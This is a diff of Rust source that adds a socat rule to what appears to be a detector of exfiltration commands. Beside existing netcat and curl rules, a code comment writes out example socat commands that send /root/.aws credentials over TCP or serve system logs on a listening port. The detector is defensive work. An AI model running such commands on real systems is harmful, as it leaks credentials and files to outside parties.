@@ -672,6 +672,17 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"\|\s*nc\s+(-[\w]+\s+)*[\w.-]+\s+[0-9]{2,5}\b").expect("Invalid regex"),
                 "pipe into netcat (exfiltration channel)",
             ),
+            // socat channels (wave-54): file-to-TCP (`socat -u STDIN
+            // TCP:host:8080 OPEN:/root/.aws/…`) and listening sockets
+            // serving files (`socat - TCP-LISTEN:4444,fork
+            // OPEN:/var/log/syslog`) — nc's more capable twin.
+            (
+                Regex::new(
+                    r"(?i)\bsocat\b[^|\n]*(open:/(etc|var|root|home|proc)|tcp-l|tcp4-l|tcp6-l)",
+                )
+                .expect("Invalid regex"),
+                "socat exfiltration channel",
+            ),
             (
                 Regex::new(r"\b(getent|printenv)\b[^|\n]*\|[^|\n]*(curl|wget|nc)\b")
                     .expect("Invalid regex"),
